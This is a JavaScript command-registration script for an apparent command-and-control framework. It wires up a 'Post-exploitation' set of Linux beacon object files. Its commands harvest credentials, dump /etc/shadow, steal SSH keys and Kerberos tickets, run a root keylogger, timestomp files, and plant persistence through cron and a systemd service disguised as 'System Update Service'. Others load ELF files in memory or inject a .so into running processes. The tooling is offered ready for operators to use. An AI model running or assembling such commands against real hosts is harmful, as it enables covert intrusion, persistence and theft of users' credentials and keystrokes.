var metadata = {
    name: "BOF Linux",
    description: "BOFs for Linux"
};

// container_detect
var cmd_container_detect = ax.create_command("container_detect", "Detects containers (Docker, Kubernetes, LXC) and provides escape hints.", "container_detect");
cmd_container_detect.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let bof_path = ax.script_dir() + "bofs_compile/container_detect." + ax.arch(id) + ".o";
    ax.execute_alias(id, cmdline, `bof "${bof_path}"`, "BOF implementation: container_detect");
});

// cred_harvest
var cmd_cred_harvest = ax.create_command("cred_harvest", "Scans for credentials belonging to all users.", "cred_harvest");
cmd_cred_harvest.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let bof_path = ax.script_dir() + "bofs_compile/cred_harvest." + ax.arch(id) + ".o";
    ax.execute_alias(id, cmdline, `bof "${bof_path}"`, "BOF implementation: cred_harvest");
});

// host_recon
var cmd_host_recon = ax.create_command("host_recon", "Collects system information.", "host_recon");
cmd_host_recon.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let bof_path = ax.script_dir() + "bofs_compile/host_recon." + ax.arch(id) + ".o";
    ax.execute_alias(id, cmdline, `bof "${bof_path}"`, "BOF implementation: host_recon");
});

// kernel_exploit_check
var cmd_kernel_exploit_check = ax.create_command("kernel_exploit_check", "Compares the kernel version against known CVEs and checks security features.", "kernel_exploit_check");
cmd_kernel_exploit_check.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let bof_path = ax.script_dir() + "bofs_compile/kernel_exploit_check." + ax.arch(id) + ".o";
    ax.execute_alias(id, cmdline, `bof "${bof_path}"`, "BOF implementation: kernel_exploit_check");
});

// ld_preload_check
var cmd_ld_preload_check = ax.create_command("ld_preload_check", "Searches for LD_PRELOAD hooks in processes, /etc/ld.so.preload, LD_LIBRARY_PATH, and writable directories.", "ld_preload_check");
cmd_ld_preload_check.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let bof_path = ax.script_dir() + "bofs_compile/ld_preload_check." + ax.arch(id) + ".o";
    ax.execute_alias(id, cmdline, `bof "${bof_path}"`, "BOF implementation: ld_preload_check");
});

// net_enum
var cmd_net_enum = ax.create_command("net_enum", "Enumerates interfaces, routes, ARP, DNS, and active TCP/UDP connections.", "net_enum");
cmd_net_enum.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let bof_path = ax.script_dir() + "bofs_compile/net_enum." + ax.arch(id) + ".o";
    ax.execute_alias(id, cmdline, `bof "${bof_path}"`, "BOF implementation: net_enum");
});

// proc_enum
var cmd_proc_enum = ax.create_command("proc_enum", "Enumerates all processes with PID, UID, name, state, threads, FDs, and command line", "proc_enum");
cmd_proc_enum.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let bof_path = ax.script_dir() + "bofs_compile/proc_enum." + ax.arch(id) + ".o";
    ax.execute_alias(id, cmdline, `bof "${bof_path}"`, "BOF implementation: proc_enum");
});

// service_enum
var cmd_service_enum = ax.create_command("service_enum", "Enumerates listening services, daemons, systemd units, and init scripts", "service_enum");
cmd_service_enum.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let bof_path = ax.script_dir() + "bofs_compile/service_enum." + ax.arch(id) + ".o";
    ax.execute_alias(id, cmdline, `bof "${bof_path}"`, "BOF implementation: service_enum");
});

// shadow_dump
var cmd_shadow_dump = ax.create_command("shadow_dump", "Dump of /etc/shadow and /etc/passwd, identifying crackable hashes (requires root)", "shadow_dump");
cmd_shadow_dump.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let bof_path = ax.script_dir() + "bofs_compile/shadow_dump." + ax.arch(id) + ".o";
    ax.execute_alias(id, cmdline, `bof "${bof_path}"`, "BOF implementation: shadow_dump");
});

// ssh_keys
var cmd_ssh_keys = ax.create_command("ssh_keys", "Scans all users for private SSH keys, authorized_keys, and configuration files", "ssh_keys");
cmd_ssh_keys.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let bof_path = ax.script_dir() + "bofs_compile/ssh_keys." + ax.arch(id) + ".o";
    ax.execute_alias(id, cmdline, `bof "${bof_path}"`, "BOF implementation: ssh_keys");
});

// sudo_check
var cmd_sudo_check = ax.create_command("sudo_check", "Analyzes sudoers, detects NOPASSWD/ALL rules, and checks membership in privileged groups", "sudo_check");
cmd_sudo_check.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let bof_path = ax.script_dir() + "bofs_compile/sudo_check." + ax.arch(id) + ".o";
    ax.execute_alias(id, cmdline, `bof "${bof_path}"`, "BOF implementation: sudo_check");
});

// suid_scan
var cmd_suid_scan = ax.create_command("suid_scan", "Scans SUID/SGID binaries and cross-references them with GTFOBins for privilege escalation.", "suid_scan");
cmd_suid_scan.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let bof_path = ax.script_dir() + "bofs_compile/suid_scan." + ax.arch(id) + ".o";
    ax.execute_alias(id, cmdline, `bof "${bof_path}"`, "BOF implementation: suid_scan");
});

// arp
var cmd_arp = ax.create_command("arp", "ARP table enumerator", "arp");
cmd_arp.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let bof_path = ax.script_dir() + "bofs_compile/arp." + ax.arch(id) + ".o";
    ax.execute_alias(id, cmdline, `bof "${bof_path}"`, "BOF implementation: arp");
});

// nslookup
var cmd_nslookup = ax.create_command("nslookup", "Make a DNS query", "nslookup google.com 8.8.8.8 | nslookup google.com,facebook.com 8.8.8.8 | nslookup www.apple.com 8.8.8.8 | nslookup 192.168.100.101");
cmd_nslookup.addArgString("domain", true, "domain, example: google.com");
cmd_nslookup.addArgString("server", false, "DNS server, example: 8.8.8.8");
cmd_nslookup.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let domain = parsed_json["domain"];
    let server = parsed_json["server"] || "";

    let bof_params = ax.bof_pack("cstr,cstr", [domain, server]);
    let bof_path = ax.script_dir() + "bofs_compile/nslookup." + ax.arch(id) + ".o";

    ax.execute_alias(id, cmdline, `bof "${bof_path}" ${bof_params}`, "BOF implementation: nslookup");
});

// portscan
var cmd_portscan = ax.create_command("portscan", "TCP port scan with banner grab", "portscan 192.168.1.1 22,80,443 | 192.168.1.1 22-1024");
cmd_portscan.addArgString("host", true, "Host IP");
cmd_portscan.addArgString("ports", true, "port or range of ports");
cmd_portscan.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let host = parsed_json["host"];
    let ports = parsed_json["ports"];

    let bof_params = ax.bof_pack("cstr,cstr", [host, ports]);
    let bof_path = ax.script_dir() + "bofs_compile/portscan." + ax.arch(id) + ".o";

    ax.execute_alias(id, cmdline, `bof_async "${bof_path}" ${bof_params}`, "BOF: portscan");
});

// timestomp
var cmd_timestomp = ax.create_command("timestomp", "Modify file timestamps - You need to specify the absolute path to the files and keep in mind that the source file path starts with @", "timestomp /tmp/evil.sh @/bin/ls");
cmd_timestomp.addArgString("target", true, "file target");
cmd_timestomp.addArgString("source", true, "file source");
cmd_timestomp.setPreHook(function (id, cmdline, parsed_json) {
    let target = parsed_json["target"];
    let source = parsed_json["source"];

    let bof_params = ax.bof_pack("cstr,cstr", [target, source]);
    let bof_path = ax.script_dir() + "bofs_compile/timestomp." + ax.arch(id) + ".o";
    ax.execute_alias(id, cmdline, `bof "${bof_path}" ${bof_params}`, "BOF: timestomp");
});

// keylogger start
var cmd_keylog_start = ax.create_command("keylog_start", "Start keylogger (Root access is required)", "keylog_start");
cmd_keylog_start.setPreHook(function (id, cmdline, parsed_json) {
    let bof_path = ax.script_dir() + "bofs_compile/keylog_start." + ax.arch(id) + ".o";
    ax.execute_alias(id, cmdline, `bof_async "${bof_path}"`, "BOF: keylog_start");
});

// keylogger dump
var cmd_keylog_dump = ax.create_command("keylog_dump", "Dump captured keystrokes", "keylog_dump");
cmd_keylog_dump.setPreHook(function (id, cmdline, parsed_json) {
    let bof_path = ax.script_dir() + "bofs_compile/keylog_dump." + ax.arch(id) + ".o";
    ax.execute_alias(id, cmdline, `bof "${bof_path}"`, "BOF: keylog_dump");
});

// klist
var cmd_klist = ax.create_command("klist", "List Kerberos credential caches and extract ticket information", "klist");
cmd_klist.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let bof_path = ax.script_dir() + "bofs_compile/krb." + ax.arch(id) + ".o";
    ax.execute_alias(id, cmdline, `bof "${bof_path}"`, "BOF implementation: klist");
});


// persist_cron
var cmd_persist_cron = ax.create_command("persist_cron", "Create persistence using cron with full configuration.", "persist_cron -c /tmp/backdoor -n */5 -h 1 -d 1 -m 1 -dw 1 -f update-check -u root");
cmd_persist_cron.addArgFlagString("-c", "command", true, "command to be executed by cron");
cmd_persist_cron.addArgFlagString("-n", "minute", false, "Minutes in cron format");
cmd_persist_cron.addArgFlagString("-h", "hour", false, "hour in cron format");
cmd_persist_cron.addArgFlagString("-d", "day_month", false, "Day of the month in cron format");
cmd_persist_cron.addArgFlagString("-m", "month", false, "Month in cron format");
cmd_persist_cron.addArgFlagString("-dw", "day_week", false, "Day of the week in cron format");
cmd_persist_cron.addArgFlagString("-f", "filename", false, "File name (when running as root)");
cmd_persist_cron.addArgFlagString("-u", "user", false, "User to execute the command (when running as root)");

cmd_persist_cron.setPreHook(function (id, cmdline, parsed_json) {
    let command = parsed_json["command"] || "";
    let minute = parsed_json["minute"] || "*/5";
    let hour = parsed_json["hour"] || "*";
    let day_month = parsed_json["day_month"] || "*";
    let month = parsed_json["month"] || "*";
    let day_week = parsed_json["day_week"] || "*";
    let filename = parsed_json["filename"] || "persistence";
    let user = parsed_json["user"] || "-";
    
    let bof_params = ax.bof_pack("cstr,cstr,cstr,cstr,cstr,cstr,cstr,cstr", [command, minute, hour, day_month, month, day_week, filename, user]);
    let bof_path = ax.script_dir() + "bofs_compile/persist_cron." + ax.arch(id) + ".o";
    ax.execute_alias(id, cmdline, `bof "${bof_path}" ${bof_params}`, "BOF: persist_cron");
});

// uptime
var cmd_uptime = ax.create_command("uptime", "Displays system uptime and load information", "uptime");
cmd_uptime.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let bof_path = ax.script_dir() + "bofs_compile/uptime." + ax.arch(id) + ".o";
    ax.execute_alias(id, cmdline, `bof "${bof_path}"`, "BOF implementation: uptime");
});

// persist_systemd
var cmd_persist_systemd = ax.create_command("persist_systemd", "Creates persistence using systemd service", "persist_systemd /tmp/backdoor system-update \"System Update Service\"");
cmd_persist_systemd.addArgString("command", true, "command or binary to execute as a service");
cmd_persist_systemd.addArgString("service_name", false, "default: system-update - Name of the systemd service");
cmd_persist_systemd.addArgString("description", false, "default: \"System Update Service\" - Service description");

cmd_persist_systemd.setPreHook(function (id, cmdline, parsed_json) {
    let command = parsed_json["command"] || "";
    let service_name = parsed_json["service_name"] || "";
    let description = parsed_json["description"] || "";

    let bof_params = ax.bof_pack("cstr,cstr,cstr", [command, service_name, description]);
    let bof_path = ax.script_dir() + "bofs_compile/persist_systemd." + ax.arch(id) + ".o";
    ax.execute_alias(id, cmdline, `bof "${bof_path}" ${bof_params}`, "BOF: persist_systemd");
});

// df
var cmd_df = ax.create_command("df", "show the amount of available and used space on the disk file systems", "df");
cmd_df.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let bof_path = ax.script_dir() + "bofs_compile/df." + ax.arch(id) + ".o";
    ax.execute_alias(id, cmdline, `bof "${bof_path}"`, "BOF implementation: df");
});

// chmod
var cmd_chmod = ax.create_command("chmod", "change permissions", "chmod 755 /tmp/file");
cmd_chmod.addArgInt("per", true, "permissions to assign");
cmd_chmod.addArgString("source", true, "file/directory for which to change permissions");

cmd_chmod.setPreHook(function (id, cmdline, parsed_json) {
    let per = parsed_json["per"] || "";
    let source = parsed_json["source"] || "";

    let bof_params = ax.bof_pack("int,cstr", [per, source]);
    let bof_path = ax.script_dir() + "bofs_compile/chmod." + ax.arch(id) + ".o";
    ax.execute_alias(id, cmdline, `bof "${bof_path}" ${bof_params}`, "BOF: chmod");
});

// chown
var cmd_chown = ax.create_command("chown", "change the owner and the group", "chown file 1000 1000");
cmd_chown.addArgString("file", true, "source file");
cmd_chown.addArgInt("uid", true, "user id");
cmd_chown.addArgInt("gid", true, "group id");


cmd_chown.setPreHook(function (id, cmdline, parsed_json) {
    let file = parsed_json["file"] || "";
    let uid = parsed_json["uid"] || "";
    let gid = parsed_json["gid"] || "";

    let bof_params = ax.bof_pack("cstr,int,int", [file, uid, gid]);
    let bof_path = ax.script_dir() + "bofs_compile/chown." + ax.arch(id) + ".o";
    ax.execute_alias(id, cmdline, `bof "${bof_path}" ${bof_params}`, "BOF: chown");
});

// load_elf
var load_elf = ax.create_command("load_elf", "Loader ELF in Memory", "load_elf /usr/bin/cat file");
load_elf.addArgFile("path", true, "Path to ELF");
load_elf.addArgString("params", false, "params ELF");
load_elf.setPreHook(function (id, cmdline, parsed_json) {

    let elf = parsed_json["path"] || "";
    let elf_params = parsed_json["params"] || "";

    let bof_params = ax.bof_pack("bytes,cstr", [elf, elf_params]);

    let bof_path = ax.script_dir() + "bofs_compile/load_elf." + ax.arch(id) + ".o";
    ax.execute_alias(id, cmdline, `bof_async "${bof_path}" ${bof_params}`, "BOF: load_elf");
});

// mv
var cmd_mv = ax.create_command("mv", "move or rename files and directories", "mv file1 file2");
cmd_mv.addArgString("file1", true, "source file");
cmd_mv.addArgString("file2", true, "destination file");

cmd_mv.setPreHook(function (id, cmdline, parsed_json) {
    let file1 = parsed_json["file1"] || "";
    let file2 = parsed_json["file2"] || "";

    let bof_params = ax.bof_pack("cstr,cstr", [file1, file2]);
    let bof_path = ax.script_dir() + "bofs_compile/mv." + ax.arch(id) + ".o";
    ax.execute_alias(id, cmdline, `bof "${bof_path}" ${bof_params}`, "BOF: mv");
});

// recon_lb
var cmd_recon_lb = ax.create_command("recon_lb", "Locate LIBXXX in system processes", "recon_lb LIBHARFBUZZ");
cmd_recon_lb.addArgString("libxxx", true, "LIBXXX to search for");

cmd_recon_lb.setPreHook(function (id, cmdline, parsed_json) {
    let libxxx = parsed_json["libxxx"] || "";

    let bof_params = ax.bof_pack("cstr", [libxxx]);
    let bof_path = ax.script_dir() + "bofs_compile/recon_lb." + ax.arch(id) + ".o";
    ax.execute_alias(id, cmdline, `bof "${bof_path}" ${bof_params}`, "BOF: recon_lb");
});

// so_inject
var so_inject = ax.create_command("so_inject", "Inject a .so into a running process via remote dlopen", "so_inject 102411 libcs.so /tmp/beacons/nax_linux_x64.so");
so_inject.addArgInt("PID", true, "Process PID");
so_inject.addArgString("memname", true, "memname");
so_inject.addArgFile("path", true, "Path to ELF");
so_inject.setPreHook(function (id, cmdline, parsed_json) {

    let PID = parsed_json["PID"] || "";
    let memname = parsed_json["memname"] || "";
    let so = parsed_json["path"] || "";

    let bof_params = ax.bof_pack("int,cstr,bytes", [PID, memname, so]);

    let bof_path = ax.script_dir() + "bofs_compile/so_inject." + ax.arch(id) + ".o";
    ax.execute_alias(id, cmdline, `bof_async "${bof_path}" ${bof_params}`, "BOF: so_inject");
});


var group_commands = ax.create_commands_group("Post-exploitation", [so_inject, cmd_recon_lb, cmd_mv, load_elf, cmd_chown, cmd_chmod, cmd_df, cmd_persist_systemd, cmd_uptime, cmd_persist_cron, cmd_klist, cmd_keylog_start, cmd_keylog_dump, cmd_timestomp, cmd_portscan, cmd_nslookup, cmd_suid_scan, cmd_arp, cmd_sudo_check, cmd_ssh_keys, cmd_shadow_dump,cmd_service_enum, cmd_proc_enum, cmd_net_enum, cmd_ld_preload_check, cmd_kernel_exploit_check, cmd_host_recon, cmd_cred_harvest, cmd_container_detect]);
ax.register_commands_group(group_commands, ["NaxDarks"], ["linux"], []);
